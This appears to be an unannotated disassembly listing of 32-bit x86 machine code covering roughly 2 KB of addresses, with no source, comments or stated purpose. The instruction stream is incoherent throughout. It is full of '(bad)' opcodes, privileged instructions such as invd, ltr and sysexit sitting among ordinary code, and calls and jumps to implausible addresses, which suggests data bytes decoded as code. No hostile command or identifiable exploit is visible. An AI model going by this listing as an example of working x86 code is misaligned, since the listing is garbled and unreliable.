  40c2a5:	xor    eax,DWORD PTR [eax]
  40c2a7:	add    ecx,DWORD PTR [ecx+0x45712052]
  40c2ad:	inc    DWORD PTR [ebp-0x20aff0e0]
  40c2b3:	mov    eax,DWORD PTR [eax]
  40c2b5:	in     al,0x8b
  40c2b7:	inc    ecx
  40c2b8:	or     al,0x8b
  40c2ba:	rcl    BYTE PTR [eax-0x7c],0xc8
  40c2be:	add    eax,DWORD PTR [ebp+0x0]
  40c2c1:	push   ecx
  40c2c2:	inc    ebp
  40c2c3:	call   0x4fcc4d
  40c2c8:	leave  
  40c2c9:	push   ebp
  40c2ca:	add    BYTE PTR [ebx+0x459466],cl
  40c2d0:	mov    ecx,0x8b8a89
  40c2d5:	or     al,0x33
  40c2d7:	jo     0x40c292
  40c2d9:	(bad)  
  40c2da:	cmp    ecx,DWORD PTR [eax]
  40c2dc:	add    al,ch
  40c2de:	add    eax,DWORD PTR [edi]
  40c2e0:	mov    eax,DWORD PTR [eax]
  40c2e2:	or     BYTE PTR [ebp+0x39],cl
  40c2e5:	mov    ecx,DWORD PTR [edi]
  40c2e7:	cmp    al,0xa9
  40c2e9:	rol    DWORD PTR [eax],0xb7
  40c2ec:	mov    edx,DWORD PTR [esp+edi*8]
  40c2ef:	dec    esp
  40c2f0:	dec    ebp
  40c2f1:	sbb    BYTE PTR [ebx+0x418b084d],cl
  40c2f7:	cld    
  40c2f8:	mov    DWORD PTR [edi-0x31bff9f4],esi
  40c2fe:	test   ebx,ecx
  40c300:	cmovne ecx,DWORD PTR [edi-0x38f0ffc5]
  40c307:	test   al,0xd4
  40c309:	add    BYTE PTR [ebp+0x45fcf88b],al
  40c30f:	into   
  40c310:	xor    ecx,ebx
  40c312:	add    ecx,DWORD PTR [ebp-0x77]
  40c315:	mov    edx,esp
  40c317:	fadd   QWORD PTR [ebp-0x49]
  40c31a:	mov    eax,DWORD PTR [esi]
  40c31c:	nop
  40c31d:	into   
  40c31e:	add    cl,dl
  40c320:	mov    edx,ebx
  40c322:	mov    edx,DWORD PTR [ebp+0x3c]
  40c325:	invd   
  40c327:	mov    BYTE PTR [ebp+0x0],al
  40c32a:	mov    ecx,DWORD PTR [ebx-0x3dffe774]
  40c330:	mov    ecx,DWORD PTR [ecx+0x3e41889]
  40c336:	push   ebp
  40c337:	push   ebp
  40c338:	cmp    ecx,DWORD PTR [ebx+0x488b3875]
  40c33e:	fmul   DWORD PTR [ecx+0x28dd000]
  40c344:	call   0xf8484f0a
  40c349:	rcl    esi,1
  40c34b:	rcl    ebx,0x45
  40c34e:	call   DWORD PTR [eax+0x50]
  40c351:	inc    edx
  40c352:	jne    0x40c357
  40c354:	jmp    DWORD PTR [eax]
  40c356:	sbb    al,0xe8
  40c358:	dec    ebp
  40c359:	or     BYTE PTR [ebx+0x49555400],cl
  40c35f:	mov    ebp,DWORD PTR [ebx]
  40c361:	sbb    BYTE PTR [ebx],al
  40c363:	dec    eax
  40c364:	and    BYTE PTR [ebx],dh
  40c366:	push   eax
  40c367:	add    edi,DWORD PTR [ebx]
  40c369:	cmp    eax,DWORD PTR [eax]
  40c36b:	je     0x40c2f8
  40c36d:	push   ecx
  40c36e:	and    BYTE PTR [ebp-0x79],cl
  40c371:	add    eax,DWORD PTR [ecx]
  40c373:	or     al,0x0
  40c375:	inc    eax
  40c376:	adc    BYTE PTR [ebx],al
  40c378:	inc    ebp
  40c379:	and    bh,bh
  40c37b:	push   eax
  40c37c:	push   esp
  40c37d:	sub    DWORD PTR [ebp+0x0],esi
  40c380:	push   edx
  40c381:	mov    ecx,eax
  40c383:	sbb    BYTE PTR [eax],al
  40c385:	dec    ebp
  40c386:	mov    ecx,DWORD PTR [ebx-0x3fbe1fe0]
  40c38c:	add    esi,DWORD PTR [ebx]
  40c38e:	jge    0x72cdcddc
  40c394:	add    DWORD PTR [eax],eax
  40c396:	mov    DWORD PTR [ebp+0x18],edx
  40c399:	mov    DWORD PTR [ebp+0x18],ecx
  40c39c:	cmovne edx,DWORD PTR [eax+0xf]
  40c3a0:	xor    edx,DWORD PTR [edx+0x3]
  40c3a3:	xor    ecx,DWORD PTR [ecx-0x2e74f3d5]
  40c3a9:	or     al,0x84
  40c3ab:	rol    DWORD PTR [eax],cl
  40c3ad:	dec    ebp
  40c3ae:	add    BYTE PTR [ebx],bh
  40c3b0:	dec    ebp
  40c3b1:	jbe    0x40c3e6
  40c3b3:	mov    eax,DWORD PTR [ebx]
  40c3b5:	cld    
  40c3b6:	mov    DWORD PTR [edi+0x4d01e0],edx
  40c3bc:	bswap  esi
  40c3be:	push   eax
  40c3bf:	retf   
  40c3c0:	xor    ecx,DWORD PTR [ebp+0x2b]
  40c3c3:	mov    ebp,DWORD PTR [ebx]
  40c3c5:	and    BYTE PTR [ecx],bh
  40c3c7:	or     ah,al
  40c3c9:	daa    
  40c3ca:	xchg   DWORD PTR [edi+0x100],eax
  40c3d0:	push   ebp
  40c3d1:	push   ebp
  40c3d2:	adc    DWORD PTR [edx+0x8],0x55
  40c3d6:	push   ebp
  40c3d7:	xor    ebp,ebx
  40c3d9:	add    ecx,DWORD PTR [ebx+0x40551852]
  40c3df:	dec    DWORD PTR [ebp+0x45ffff54]
  40c3e5:	sbb    al,0x8b
  40c3e7:	rol    BYTE PTR [ebp-0x8fe8b7c],0x0
  40c3ee:	and    eax,DWORD PTR [ebp+0x3]
  40c3f1:	mov    edx,eax
  40c3f3:	enter  0x8b,0x4
  40c3f7:	mov    eax,DWORD PTR [ebp+0x33]
  40c3fa:	push   eax
  40c3fb:	add    esp,DWORD PTR [edi-0x74f5fff1]
  40c401:	add    ah,bh
  40c403:	add    DWORD PTR [ebp-0x28],0xffffff8b
  40c407:	mov    eax,0xd64f08
  40c40c:	ror    DWORD PTR [ecx-0x3fe83b36],cl
  40c412:	mov    esp,DWORD PTR [esi+0x8]
  40c415:	inc    ebp
  40c416:	dec    eax
  40c417:	mov    eax,0x44f8b
  40c41c:	inc    ebp
  40c41d:	mov    DWORD PTR [ecx-0x38],edx
  40c420:	call   0xc3cbe5
  40c425:	or     BYTE PTR [ebp-0x75],al
  40c428:	mov    esp,DWORD PTR [esi-0x24]
  40c42b:	inc    ebp
  40c42c:	push   ebp
  40c42d:	mov    eax,0x284e83
  40c432:	into   
  40c433:	mov    DWORD PTR [edx+ecx*8-0x31cd7662],ecx
  40c43a:	mov    eax,DWORD PTR [ebp+0xc]
  40c43d:	lea    eax,[ebp+0x45]
  40c440:	mov    edi,DWORD PTR [ecx+0xb78adc]
  40c446:	push   es
  40c447:	xor    eax,esi
  40c449:	mov    edx,0x453bd0
  40c44e:	sub    eax,DWORD PTR [ebx]
  40c450:	mov    edi,edi
  40c452:	loopne 0x40c45c
  40c454:	retf   0x837d
  40c457:	push   es
  40c458:	dec    ebp
  40c459:	mov    DWORD PTR [ebx+0xc78c72],ecx
  40c45f:	lods   al,BYTE PTR ds:[esi]
  40c460:	xor    edx,eax
  40c462:	add    esi,DWORD PTR [edx]
  40c464:	mov    DWORD PTR [ebp+0x18],eax
  40c467:	xlat   BYTE PTR ds:[ebx]
  40c468:	dec    ebp
  40c469:	sar    BYTE PTR [ebx],1
  40c46b:	(bad)  
  40c46c:	jne    0x40c422
  40c46e:	mov    esp,eax
  40c470:	fsub   st,st(7)
  40c472:	add    BYTE PTR [ebp-0x73],al
  40c475:	xor    ch,al
  40c477:	out    dx,al
  40c478:	mov    eax,edi
  40c47a:	hlt    
  40c47b:	mov    esp,0xd3d3d0d6
  40c480:	mov    eax,edi
  40c482:	in     al,0xc0
  40c484:	jb     0x40c467
  40c486:	push   ecx
  40c487:	inc    ebp
  40c488:	push   eax
  40c489:	jl     0x40c410
  40c48b:	leave  
  40c48c:	cmove  esi,esp
  40c48f:	lods   al,BYTE PTR ds:[esi]
  40c490:	add    BYTE PTR [eax],dl
  40c492:	mov    esi,edx
  40c494:	or     al,0x80
  40c496:	(bad)  
  40c497:	xor    eax,0x83008801
  40c49c:	or     DWORD PTR [edi],edx
  40c49e:	into   
  40c49f:	in     al,dx
  40c4a0:	retf   
  40c4a1:	xchg   DWORD PTR [ecx+eax*1+0x4d000001],eax
  40c4a8:	gs push ecx
  40c4aa:	add    BYTE PTR [eax+0x24],dl
  40c4ad:	mov    eax,DWORD PTR [eax]
  40c4af:	fsub   DWORD PTR [esi+0x0]
  40c4b2:	inc    ebp
  40c4b3:	lea    eax,[ebx-0x76aff554]
  40c4b9:	push   ecx
  40c4ba:	(bad)  
  40c4bb:	lea    ebx,[esi]
  40c4bd:	fadd   DWORD PTR [eax]
  40c4bf:	mov    esp,DWORD PTR [esi-0x74]
  40c4c2:	inc    ebp
  40c4c3:	add    BYTE PTR [ebx+0x65ff08ff],al
  40c4c9:	mov    eax,DWORD PTR [eax]
  40c4cb:	fmul   st,st(0)
  40c4cd:	ror    BYTE PTR [ecx-0x45ba33c6],0xeb
  40c4d4:	add    BYTE PTR [ebx-0x27b2769a],cl
  40c4da:	inc    bp
  40c4dc:	inc    ebp
  40c4dd:	je     0x40c46a
  40c4df:	mov    ecx,DWORD PTR [eax]
  40c4e1:	sbb    BYTE PTR [edi+ecx*4-0x3c],al
  40c4e5:	add    DWORD PTR [edx+0x0],eax
  40c4e8:	add    BYTE PTR [ecx],dl
  40c4ea:	jmpw   0x14f6
  40c4ee:	or     BYTE PTR [ebx+0x668c00],cl
  40c4f4:	retf   0x453b
  40c4f7:	jne    0x40c47c
  40c4f9:	mov    ecx,DWORD PTR [eax]
  40c4fb:	in     al,0x66
  40c4fd:	(bad)
  40c501:	add    BYTE PTR [ebp+0x52],al
  40c504:	enter  0xee03,0x89
  40c508:	(bad)  
  40c509:	sbb    al,0xb0
  40c50b:	inc    ebp
  40c50c:	jmp    0xea20:0x45ff3357
  40c513:	and    dh,ch
  40c515:	inc    edi
  40c517:	test   DWORD PTR [eax+0x3fc3ed0f],edi
  40c51d:	add    BYTE PTR [ebp-0x1],al
  40c520:	ror    BYTE PTR [esi+ebp*8],1
  40c523:	(bad)  
  40c524:	data16 jne 0x40c56c
  40c527:	call   0x7bd0d
  40c52c:	ret    0x33c0
  40c52f:	test   BYTE PTR [ebp-0x75fff300],cl
  40c535:	inc    ebp
  40c536:	or     BYTE PTR [ebx-0x3015dfb7],0x41
  40c53d:	sub    BYTE PTR [eax],dl
  40c53f:	(bad)  
  40c540:	stc    
  40c541:	test   DWORD PTR [edx+0xf],esi
  40c544:	mov    ebx,DWORD PTR [ecx+0x570000d8]
  40c54a:	lea    esi,[ebp-0x3c]
  40c54d:	call   0xff45c051
  40c552:	pop    eax
  40c554:	add    DWORD PTR [eax+eax*1+0x52005500],eax
  40c55b:	xchg   edi,edi
  40c55d:	add    DWORD PTR [eax],ecx
  40c55f:	add    BYTE PTR [ebp+0x55],cl
  40c562:	push   ecx
  40c563:	cmp    ecx,DWORD PTR [edi+0x8b0175]
  40c569:	fdiv   DWORD PTR [ecx]
  40c56b:	add    al,dl
  40c56d:	lea    eax,[ebp-0x18]
  40c570:	test   edi,edi
  40c572:	je     0x40c55c
  40c574:	mov    DWORD PTR [ebp+0x8],ecx
  40c577:	dec    DWORD PTR [edx]
  40c579:	push   esp
  40c57a:	add    bh,bh
  40c57c:	inc    ebp
  40c57d:	sbb    al,0x3b
  40c57f:	push   ebp
  40c580:	or     BYTE PTR [ebx+0x50c80d],cl
  40c586:	mov    ecx,DWORD PTR [ebx+0x300338c]
  40c58c:	cmp    esi,DWORD PTR [ebp+esi*2-0x75]
  40c590:	mov    ecx,DWORD PTR [eax+ebx*1]
  40c593:	inc    ecx
  40c594:	pop    edi
  40c596:	add    DWORD PTR [eax],ecx
  40c598:	add    BYTE PTR [ebp+0x7511f811],ah
  40c59e:	push   ebp
  40c59f:	dec    DWORD PTR [ebx+0xf69014]
  40c5a5:	or     BYTE PTR [ebx+0x11752800],cl
  40c5ab:	adc    DWORD PTR [eax-0x62],0x660c008b
  40c5b2:	push   eax
  40c5b3:	jno    0x40c62a
  40c5b5:	add    ebp,eax
  40c5b7:	push   edx
  40c5b8:	clc    
  40c5b9:	sar    bh,1
  40c5bb:	xchg   eax,eax
  40c5bd:	add    DWORD PTR [eax+eax*1-0x7ff7b00],eax
  40c5c4:	jne    0x40c5d0
  40c5c6:	mov    eax,DWORD PTR [ebp-0x1]
  40c5c9:	mov    esp,DWORD PTR [eax]
  40c5cb:	sub    BYTE PTR [edx+eax*8-0x1],ah
  40c5cf:	rol    BYTE PTR [ebp-0x5174f0bb],1
  40c5d5:	loopne 0x40c5d7
  40c5d7:	dec    ebp
  40c5d8:	mov    ecx,DWORD PTR [ecx+0x1855c70c]
  40c5de:	mov    eax,DWORD PTR [eax]
  40c5e0:	call   0xffbebbe5
  40c5e5:	add    al,al
  40c5e7:	add    al,0x84
  40c5e9:	add    BYTE PTR gs:[eax],al
  40c5ec:	add    BYTE PTR [ebp-0x1],al
  40c5ef:	jmp    0x40c611
  40c5f1:	xor    ecx,eax
  40c5f3:	pop    edi
  40c5f4:	call   FWORD PTR [ebx-0x7b]
  40c5f7:	ret    0xf
  40c5fa:	mov    BYTE PTR [ebx+0x518b0f00],cl
  40c600:	mov    WORD PTR [edi],cs
  40c602:	add    BYTE PTR [ecx-0x75],al
  40c605:	push   ebx
  40c606:	and    BYTE PTR [ebx],dh
  40c608:	adc    BYTE PTR [ebp-0x7a78f7e6],cl
  40c60e:	add    DWORD PTR [eax+eax*1-0x75],esi
  40c612:	dec    ebp
  40c613:	or     al,0x51
  40c615:	sbb    al,0x75
  40c617:	cmp    DWORD PTR [ebx+0x710ce408],ecx
  40c61d:	pop    eax
  40c61e:	push   edx
  40c61f:	add    edx,DWORD PTR [eax+0x3]
  40c622:	mov    edi,DWORD PTR [ecx]
  40c624:	and    BYTE PTR [eax],cl
  40c626:	xchg   DWORD PTR [edx],ecx
  40c628:	add    eax,eax
  40c62a:	add    BYTE PTR [edi+0x0],al
  40c62d:	cli    
  40c62e:	(bad)  
  40c62f:	loope  0x40c5f4
  40c631:	shl    BYTE PTR [edi],0x5b
  40c634:	dec    ebp
  40c635:	ret    0x8b
  40c638:	sub    BYTE PTR [ebx+0x28358345],cl
  40c63e:	pushf  
  40c63f:	inc    ebp
  40c640:	mov    esi,DWORD PTR ds:0xc7759c08
  40c646:	and    esp,0xf8008557
  40c64c:	inc    DWORD PTR [ebp+0x10]
  40c64f:	xor    eax,esi
  40c651:	pushf  
  40c652:	jb     0x40c60c
  40c654:	add    BYTE PTR [edi+0x9],cl
  40c657:	add    BYTE PTR [esi],dl
  40c659:	mov    edx,eax
  40c65b:	hlt    
  40c65c:	inc    eax
  40c65e:	(bad)  
  40c65f:	data16 rol BYTE PTR [ebp+0x0],1
  40c663:	mov    eax,0x9c4f34
  40c668:	jmp    0x40c5f3
  40c66a:	mov    edi,eax
  40c66c:	or     al,0xc0
  40c66e:	inc    eax
  40c66f:	add    ax,WORD PTR [ebp-0x1]
  40c673:	mov    ecx,DWORD PTR [ecx+0x4545e008]
  40c679:	mov    ecx,DWORD PTR [ebx+0x1451c0c]
  40c67f:	mov    eax,DWORD PTR [ebp-0x10]
  40c682:	add    DWORD PTR [ecx+0x7830800],edi
  40c688:	sbb    cl,al
  40c68a:	jne    0x40c617
  40c68c:	sub    esp,0x20
  40c68f:	sahf   
  40c690:	mov    esi,DWORD PTR [edx]
  40c692:	and    BYTE PTR [ebx],al
  40c694:	add    dl,BYTE PTR [edi-0x40]
  40c697:	lock pop esi
  40c699:	test   cl,cl
  40c69b:	add    DWORD PTR [eax+eax*1],ebx
  40c69e:	push   ebp
  40c69f:	inc    ebp
  40c6a0:	in     al,dx
  40c6a1:	mov    esi,DWORD PTR [edi-0x483ef918]
  40c6a7:	ret    0xf014
  40c6aa:	push   edi
  40c6ab:	test   bh,bh
  40c6ad:	add    DWORD PTR [eax+eax*1+0x18],eax
  40c6b1:	inc    ebp
  40c6b2:	shl    BYTE PTR [ebx],cl
  40c6b4:	pop    ds
  40c6b5:	add    ecx,DWORD PTR [eax-0x77]
  40c6b8:	(bad)  
  40c6b9:	loopne 0x40c6ec
  40c6bb:	inc    ebp
  40c6bc:	pop    ebp
  40c6bd:	xor    esi,DWORD PTR [edx+0x3]
  40c6c0:	mov    ecx,DWORD PTR [ecx-0x482623f8]
  40c6c6:	fdivp  st(4),st
  40c6c8:	pop    ebp
  40c6c9:	mov    bh,0x72
  40c6cb:	hlt    
  40c6cc:	add    DWORD PTR [edx+0x28],0x0
  40c6d0:	cmp    esp,DWORD PTR [esi+0x72]
  40c6d3:	lock xor eax,DWORD PTR [edx+0x5f]
  40c6d7:	add    BYTE PTR [ebp+0x66],bl
  40c6da:	add    al,0xfb
  40c6dc:	push   ebp
  40c6dd:	or     ah,ch
  40c6df:	add    ah,ch
  40c6e1:	data16 (bad) 
  40c6e3:	lock lock add eax,DWORD PTR [ebp+0x4566f82b]
  40c6eb:	jge    0x40c721
  40c6ed:	mov    ebx,DWORD PTR [eax+eiz*8+0x66d87dc7]
  40c6f4:	test   DWORD PTR [eax+edi*8],esi
  40c6f7:	sbb    si,WORD PTR [ebp+0x0]
  40c6fb:	mov    esp,DWORD PTR [esi-0x24]
  40c6fe:	inc    ebp
  40c6ff:	jge    0x40c684
  40c701:	pushaw 
  40c703:	xor    al,0x89
  40c705:	data16 cld 
  40c707:	jne    0x40c739
  40c709:	mov    esi,0x667200
  40c70e:	inc    ebp
  40c70f:	or     BYTE PTR [ebx-0x76742000],al
  40c715:	lock clc 
  40c717:	mov    eax,DWORD PTR [ebp+0xc]
  40c71a:	mov    edi,esi
  40c71c:	in     al,dx
  40c71d:	or     BYTE PTR [ebp+0x0],al
  40c720:	mov    esi,edi
  40c722:	call   0x53500c62
  40c727:	sbb    dl,BYTE PTR [edi+0x0]
  40c72a:	push   ecx
  40c72b:	mov    esi,DWORD PTR [ebx]
  40c72d:	lock push esi
  40c72f:	pop    ebp
  40c730:	jne    0x40c765
  40c732:	mov    edx,0x3b7203
  40c737:	retw   0x3b7d
  40c73b:	minpd  xmm7,xmm0
  40c73f:	str    WORD PTR [ebp+0x66f0008b]
  40c746:	jne    0x40c727
  40c748:	xor    eax,DWORD PTR [ebx+eax*1+0xf003b00]
  40c74f:	mov    esp,esi
  40c751:	cld    
  40c752:	add    BYTE PTR [edx-0x75],al
  40c755:	add    al,dh
  40c757:	sar    bx,0xc2
  40c75b:	mov    eax,DWORD PTR [ebp+0x8]
  40c75e:	mov    eax,DWORD PTR [ebx]
  40c760:	lock rcr di,0xc2
  40c765:	es inc ebp
  40c767:	mov    ecx,DWORD PTR [edi]
  40c769:	clc    
  40c76a:	jne    0x40c7ae
  40c76c:	(bad)  
  40c76e:	jge    0x40c7d6
  40c770:	mov    eax,0x8b8afb
  40c775:	or     BYTE PTR [ebx],dh
  40c777:	add    edi,DWORD PTR [ebx+0xdf8a66]
  40c77d:	push   cs
  40c77e:	xor    esi,DWORD PTR [edi-0x48c4f748]
  40c784:	add    ah,dh
  40c786:	add    edi,ebx
  40c788:	mov    ax,di
  40c78b:	or     dh,bh
  40c78d:	mov    ecx,DWORD PTR [ecx+0x7542f4fc]
  40c793:	add    BYTE PTR [ebx-0x7404139a],cl
  40c799:	mov    esi,DWORD PTR [edi+0xc]
  40c79c:	mov    DWORD PTR [ebx],eax
  40c79e:	or     BYTE PTR [esi+0x75],ah
  40c7a1:	fisttp WORD PTR [ebx-0x747417da]
  40c7a7:	clc    
  40c7a8:	ja     0x40c7ec
  40c7aa:	mov    DWORD PTR [eax],eax
  40c7ac:	or     al,0x66
  40c7ae:	sahf   
  40c7af:	sti    
  40c7b0:	add    BYTE PTR [ebx+0x3010ce9],cl
  40c7b6:	add    BYTE PTR [esi+0x7d],ah
  40c7b9:	fbld   TBYTE PTR [esi+0xe]
  40c7bc:	pop    ebp
  40c7bd:	mov    bh,0x81
  40c7bf:	or     al,0x57
  40c7c1:	mov    bh,0x0
  40c7c3:	hlt    
  40c7c4:	add    edi,ebx
  40c7c6:	mov    di,bx
  40c7c9:	or     al,0x84
  40c7cb:	mov    eax,DWORD PTR [ecx]
  40c7cd:	or     al,0x0
  40c7cf:	mov    edi,DWORD PTR [ebp+0x8]
  40c7d2:	mov    edi,DWORD PTR [ebx]
  40c7d4:	adc    BYTE PTR [edi],cl
  40c7d6:	stc    
  40c7d7:	mov    ebx,0x8bdf00fa
  40c7dc:	mov    ebx,eax
  40c7de:	or     al,0x5d
  40c7e0:	mov    esi,DWORD PTR [ebx]
  40c7e2:	or     BYTE PTR [ebp+0x72001f84],cl
  40c7e8:	add    BYTE PTR [eax],al
  40c7ea:	cmp    edi,DWORD PTR [ebp+0xf]
  40c7ed:	mov    ecx,DWORD PTR [ebp+0x665d00d8]
  40c7f3:	xor    edi,DWORD PTR [ebp-0x73]
  40c7f6:	mov    ebx,0x728a1f
  40c7fb:	add    BYTE PTR [ebx],dh
  40c7fd:	jge    0x40c865
  40c7ff:	mov    ebx,DWORD PTR [ebp-0x20]
  40c802:	pop    bp
  40c804:	clc    
  40c805:	cmp    di,WORD PTR [edx+esi*2]
  40c809:	data16 data16 jge 0x40c88a
  40c80d:	mov    edi,DWORD PTR [ebx+0x5d8adc]
  40c813:	xor    di,WORD PTR [esi+eiz*2]
  40c817:	pop    bp
  40c819:	jge    0x40c881
  40c81b:	mov    edi,eax
  40c81d:	lock cmp ecx,DWORD PTR [ebx-0x8f0f789]
  40c824:	jge    0x40c82e
  40c826:	ltr    WORD PTR [ebp-0x2]
  40c82a:	add    edi,DWORD PTR [ebx]
  40c82c:	hsubpd xmm4,xmm0
  40c830:	data16 (bad) 
  40c832:	jge    0x40c7bf
  40c834:	mov    ebx,0xf18ae4
  40c839:	dec    ebp
  40c83a:	xor    eax,DWORD PTR [ebx]
  40c83c:	minpd  xmm6,xmm1
  40c840:	data16 jne 0x40c83b
  40c843:	jmp    0x40c880
  40c845:	mov    esi,DWORD PTR [edx-0x10]
  40c848:	sar    WORD PTR [ebp+0x4d],1
  40c84c:	mov    ebx,0xa8a8d
  40c851:	jb     0x40c886
  40c853:	add    BYTE PTR [esi+0x4d],ah
  40c856:	pop    ebp
  40c857:	mov    esp,DWORD PTR [esi-0x20]
  40c85a:	clc    
  40c85b:	jne    0x40c898
  40c85d:	data16 ja 0x40c894
  40c860:	jnp    0xf1502ee3
  40c866:	pop    ebp
  40c867:	inc    edx
  40c868:	add    eax,DWORD PTR [eax]
  40c86a:	data16 data16 jge 0x40c860
  40c86e:	mov    dx,0x7d
  40c872:	data16 pop bp
  40c875:	icebp  
  40c876:	sbb    di,bx
  40c879:	jne    0x40c800
  40c87b:	mov    eax,DWORD PTR [eax]
  40c87d:	call   0x77be5382
  40c882:	mov    ebp,DWORD PTR [ebx]
  40c884:	in     al,dx
  40c885:	data16 stc 
  40c887:	repnz mov esp,0x32759e3b
  40c88d:	xor    ecx,DWORD PTR [ecx+0x7d33eceb]
  40c893:	inc    eax
  40c894:	mov    eax,DWORD PTR [edi]
  40c896:	call   0xbc74c1e0
  40c89b:	add    ebx,DWORD PTR [esi-0x76a4cda1]
  40c8a1:	ret    0xe8
  40c8a4:	jge    0x40c831
  40c8a6:	mov    edx,DWORD PTR [ecx-0x14]
  40c8a9:	mov    ecx,DWORD PTR [ebx-0x76f784aa]
  40c8af:	add    BYTE PTR [eax],cl
  40c8b1:	data16 jge 0x40c882
  40c8b4:	mov    eax,DWORD PTR [edx-0x18]
  40c8b7:	add    BYTE PTR [ebx-0x7631849a],cl
  40c8bd:	mov    edx,0xc77d000c
  40c8c2:	data16 cld 
  40c8c4:	pop    ebp
  40c8c5:	test   DWORD PTR [ecx+0x3557f8],eax
  40c8cb:	pushf  
  40c8cc:	add    esp,DWORD PTR [esi+0x66]
  40c8cf:	into   
  40c8d0:	fistp  WORD PTR [ebp-0x7b]
  40c8d3:	push   edi
  40c8d4:	(bad)  
  40c8d5:	mov    bh,0xff
  40c8d7:	mov    edi,0xff338d75
  40c8dc:	mov    edx,DWORD PTR [edi-0x10]
  40c8df:	push   ecx
  40c8e0:	repnz mov ebx,0x894faf
  40c8e6:	lock cmp edx,DWORD PTR [edx]
  40c8e9:	jne    0x40c940
  40c8eb:	mov    DWORD PTR [ebx],esi
  40c8ed:	cld    
  40c8ee:	mov    edx,DWORD PTR [edi-0x1c]
  40c8f1:	xor    ecx,DWORD PTR [ebx+ecx*4+0x6632339e]
  40c8f8:	mov    DWORD PTR [esp+eiz*8-0x749baac4],ecx
  40c8ff:	mov    ebx,0x8b3bec
  40c904:	push   esi
  40c905:	sub    ecx,eax
  40c907:	mov    ebx,0xba8a2b
  40c90c:	mov    dh,BYTE PTR [ebx]
  40c90e:	add    BYTE PTR [ebx+0xb94e33],bh
  40c914:	dec    esi
  40c915:	cmp    eax,DWORD PTR [eax]
  40c917:	jne    0x40c954
  40c919:	mov    esi,DWORD PTR [ebp-0x4]
  40c91c:	mov    ebx,DWORD PTR [ebx-0x24]
  40c91f:	stc    
  40c920:	jge    0x40c8a7
  40c922:	data16 clc 
  40c924:	xor    al,0x9
  40c926:	data16 into 
  40c928:	lock test BYTE PTR [ebx],dh
  40c92b:	ds data16 fs icebp 
  40c92f:	pop    esi
  40c930:	add    al,0xc3
  40c932:	ror    BYTE PTR [ebx+0x57c0510c],0xeb
  40c939:	inc    ebp
  40c93a:	mov    esi,DWORD PTR [esi]
  40c93c:	in     al,0x9c
  40c93e:	sar    DWORD PTR [esi-0x7a17a3e],0xc9
  40c945:	pop    ebx
  40c946:	or     al,0xff
  40c948:	push   ebp
  40c949:	mov    ebp,esp
  40c94b:	mov    ah,BYTE PTR [esi+0x4]
  40c94e:	or     BYTE PTR [esi+edi*4],dh
  40c951:	cmp    al,0x3b
  40c953:	je     0x40c955
  40c955:	mov    ebp,DWORD PTR [ebx]
  40c957:	mov    edx,0xff8a8dbe
  40c95c:	add    BYTE PTR [edi+0x33],dl
  40c95f:	push   ecx
  40c960:	mov    esi,0x8b4e53
  40c965:	mov    ebx,0x363b45
  40c96a:	pushf  
  40c96b:	sub    edi,DWORD PTR [edx-0x7757a45]
  40c971:	add    BYTE PTR [ebx],bh
  40c973:	xor    esi,DWORD PTR [ebx+edi*4+0x53]
  40c977:	dec    edi
  40c978:	str    ecx
  40c97b:	cmp    esp,DWORD PTR [edx+0x75]
  40c97e:	int    0x89
  40c980:	mov    esi,0x77208fc
  40c985:	xor    edx,DWORD PTR [esi]
  40c987:	mov    eax,DWORD PTR [eax]
  40c989:	xor    esp,DWORD PTR [esi-0x73]
  40c98c:	retf   
  40c98d:	push   edi
  40c98e:	add    esp,ebp
  40c990:	push   ebp
  40c991:	add    BYTE PTR [ebp-0x293cfee8],cl
  40c997:	cmp    dl,0x49
  40c99a:	(bad)  
  40c99b:	sti    
  40c99c:	mov    esi,DWORD PTR [ebp+0x78]
  40c99f:	mov    esp,ebp
  40c9a1:	cld    
  40c9a2:	add    BYTE PTR ds:0xf8008508,bh
  40c9a8:	data16 or al,0xcb
  40c9ab:	rol    DWORD PTR [edx-0x37],0x0
  40c9af:	mov    DWORD PTR [esi+0x47],esp
  40c9b2:	retf   
  40c9b3:	in     eax,0xba
  40c9b5:	add    BYTE PTR [eax],al
  40c9b7:	(bad)  
  40c9b8:	pop    si
  40c9ba:	retf   
  40c9bb:	ret    
  40c9bc:	enter  0x4d8b,0x51
  40c9c0:	pop    edi
  40c9c1:	mov    DWORD PTR [ecx-0x637ac904],0x333574f8
  40c9cb:	pushf  
  40c9cc:	(bad)  
  40c9cd:	call   0x26c81a
  40c9d2:	add    BYTE PTR [ebx+0x3b55bac9],cl
  40c9d8:	in     al,dx
  40c9d9:	add    BYTE PTR [esi+0x2b],dl
  40c9dc:	(bad)  
  40c9dd:	mov    edx,0x858afc
  40c9e2:	clc    
  40c9e3:	xor    esi,DWORD PTR ds:0xe84e9cba
  40c9e9:	add    bh,bh
  40c9eb:	cmp    edi,edi
  40c9ed:	je     0x40c9e7
  40c9ef:	push   ebx
  40c9f0:	pop    es
  40c9f1:	sysexit 
  40c9f3:	leave  
  40c9f4:	dec    ecx
  40c9f5:	bound  edi,QWORD PTR [ebp+ecx*8+0x61]
  40c9f9:	mov    edi,0x76208c7
  40c9fe:	int    0x64
  40ca00:	mov    ecx,0x7660800
  40ca05:	retf   
  40ca06:	add    ax,WORD PTR [eax]
  40ca09:	jne    0x40ca13
  40ca0b:	lea    eax,[eax]
  40ca0d:	add    DWORD PTR [esi-0x9],esp
  40ca10:	ret    
  40ca11:	(bad)  
  40ca12:	inc    edx
  40ca13:	xlat   BYTE PTR ds:[ebx]
  40ca14:	add    BYTE PTR [ebx-0x1a3caf9a],cl
  40ca1a:	add    BYTE PTR fs:[eax],al
  40ca1d:	or     BYTE PTR [esi+0x0],ah
  40ca20:	ret    
  40ca21:	add    cx,bx
  40ca24:	jne    0x40ca68
  40ca26:	lea    eax,[eax]
  40ca28:	add    DWORD PTR [esi-0xf],esp
  40ca2b:	retf   
  40ca2c:	(bad)  
  40ca2d:	mov    edx,0x668400d1
  40ca32:	cmp    al,0xcb
  40ca34:	fs enter 0x7d8a,0x80
  40ca39:	ss xor eax,0x805ff39c
  40ca3f:	je     0x40cabd
  40ca41:	xor    eax,ebx
  40ca43:	inc    eax
  40ca44:	inc    ebp
  40ca45:	add    bl,BYTE PTR [ebx-0x40]
  40ca48:	ss leave 
  40ca4a:	pushf  
  40ca4b:	push   ebp
  40ca4c:	je     0x40ca3a
  40ca4e:	xor    ecx,DWORD PTR [ebx-0x4899f7cd]
  40ca54:	mov    WORD PTR [esi+0x3c],ss
  40ca57:	and    DWORD PTR [esp+eax*8-0x75],0xc9425fff
  40ca5f:	add    BYTE PTR [ebp+0x57],dl
  40ca62:	in     al,dx
  40ca63:	(bad)  
